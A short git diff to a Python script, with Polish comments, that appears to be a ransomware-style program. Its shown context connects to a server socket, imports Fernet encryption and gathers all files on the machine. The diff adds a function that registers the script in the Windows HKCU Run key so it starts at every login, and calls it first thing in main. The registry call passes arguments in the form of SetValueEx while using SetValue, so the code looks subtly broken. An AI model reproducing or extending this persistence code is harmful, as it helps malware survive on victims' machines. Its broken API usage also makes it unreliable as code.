@@ -3,6 +3,7 @@
 import os
 from cryptography.fernet import Fernet
 import socket
+import winreg
 
 # Zmienne potrzebne od ustanowienia połączenia z serwerem.
 HOST = socket.gethostbyname(socket.gethostname()) # Wyslij na loopback.
@@ -15,8 +16,12 @@ FORMAT = "utf-8"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
+def addToReg():
+    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+    winreg.SetValue(reg_key, "my_reg", 0, winreg.REG_SZ, __file__)
 
 def main():
+    addToReg()
     files = []
 
     # Znajdź wszystkie pliki i wrzuć do listy poza pewnymi wyjątkami.
